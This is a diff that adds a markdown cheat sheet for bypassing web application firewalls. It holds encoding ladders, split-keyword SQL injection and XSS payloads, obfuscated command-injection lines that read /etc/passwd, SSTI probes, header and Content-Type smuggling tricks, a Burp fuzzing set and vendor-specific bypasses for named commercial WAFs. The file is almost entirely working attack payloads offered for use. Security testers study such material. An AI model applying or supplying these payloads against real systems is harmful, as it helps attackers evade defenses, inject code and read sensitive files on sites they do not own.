@@ -1,0 +1,106 @@
+# Universal WAF Bypass Cheat Sheet
+
+General-purpose encoding/obfuscation that applies to **any** injection type (SQLi, XSS, command, SSTI) when a WAF blocks the plain payload.
+
+## Order of attempts (most reliable first)
+1. **Mixed case** — `SeLeCt`, `aLerT`
+2. **Comments as separators** — `/**/`, `/*!...*/`
+3. **Whitespace swap** — tab `%09`, newline `%0a`, CR `%0d`, no space
+4. **Double URL encoding** — `%2527` → server decodes to `%27` → app decodes to `'`
+5. **Unicode / smart chars** — `′`, `﹤`, fullwidth variants
+6. **Null bytes / control chars** — `%00`, `%0d%0a`
+7. **Reverse/rotate input placement** — header vs body vs cookie
+8. **Protocol downgrade** — HTTP/1.0, chunked TE, `X-Forwarded-*` smuggling to the app after WAF
+
+## Universal encoding table
+```
+'  ->  %27  ->  %2527
+"  ->  %22  ->  %2522
+<  ->  %3c  ->  %253c  ->  \x3c  ->  \u003c  ->  &#x3c;
+>  ->  %3e  ->  %253e  ->  \x3e  ->  \u003e
+space -> +  ->  %20  ->  %09  ->  %0a  ->  %2f**
+/  ->  %2f  ->  %252f  ->  \
+=  ->  %3d  ->  %253d  ->  %3d%00
+(  ->  %28  ->  %2528
+)  ->  %29  ->  %2529
+;  ->  %3b  ->  %253b
+,  ->  %2c
+```
+## Split keyword techniques
+```
+# SQL
+UN/**/ION SE/**/LECT
+uNiOn SeLeCt
+UNION%09SELECT
+UNION%2520SELECT
+
+# XSS
+<scr<script>ipt>
+<sVg/OnLoAd>
+
+# Command
+c'a't /etc/passwd
+c"a"t /etc/passwd
+ca$@t /etc/passwd
+c\a\t /etc/passwd
+/???/c?t ???/p??swd
+
+# SSTI
+${7*7}  {{7*7}}  ${T(...).exec}  (case variations)
+```
+
+## MySQL comment cleverness
+```
+/*!50000SELECT*/ 1,2,3
+SELECT/*!50000version()*/;
+1'/*!50000UNION SELECT*/NULL--
+```
+
+## The "garbage char" MVP set
+```
+%00 %01 %02 %03 %04 %05 %06 %07 %08 %09 %0a %0b %0c %0d %0e %0f
+%1f %7f %80-%a0
+```
+Try inserting a single control char INSIDE a keyword: `UN%09ION`, `al%09ert`.
+
+## Header-based smuggling (WAF→app disagreements)
+```
+X-Forwarded-For: <payload>
+X-Original-URL: /api/<payload>
+X-Rewrite-URL: <b64 payload>
+X-HTTP-Method-Override: TRACE/POST
+Content-Type: application/x-www-form-urlencoded  (vs JSON) — switches WAF rule-set
+```
+## JSON vs form split (the "body noise" trick)
+WAFs often skip `multipart` bodies; many skip `application/x-www-form-urlencoded` on some rules. Try the same payload in each:
+```
+POST /login  Content-Type: application/x-www-form-urlencoded
+POST /login  Content-Type: application/json       {"x":"PAYLOAD"}
+POST /login  Content-Type: multipart/form-data    (base64 wrapper trick)
+```
+
+## Burp Intruder universal tag set
+```
+§ A good tag set for fuzzing keyword positions:
+%00 %01 %02 %09 %0a %0d %20 %2f /**/ /*!*/ + ~ ` "'%'%' -- -#
+```
+
+## WAF-specific quick notes (2026 stack)
+| WAF | Common bypass |
+|-----|----------------|
+| Cloudflare | `%0a` space bypass, tab between keyword+space, oversized POST body |
+| AWS WAF | JSON body mis-tokenization, `multipart/form-data`, null byte trailing |
+| Akamai | non-ASCII padding, header case `x-forwarded-for` value tricks |
+| ModSecurity | `\t` tab in operators, `%u` encoding, comment fences |
+| F5 | unicode overlong, HTTP.sys body decoding, `Transfer-Encoding` + CL |
+| Sucuri | base64 values in GET params (`?s=dGVzdA==`), hex-encoded paths |
+
+## Final fallback: luck-based "junk prefix"
+Prefix the payload with junk until WAF parser gives up:
+```
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' OR 1=1--
+<img/src=x NOSCRIPT no=yes onerror=alert(1) />
+```
+
+## Remember
+WAF bypass is iterative: send payload A → if blocked, add encoding layer B → resend. Automate with Burp Intruder + a "encoding ladder" wordlist (tab/newline/nul mixed with each character).
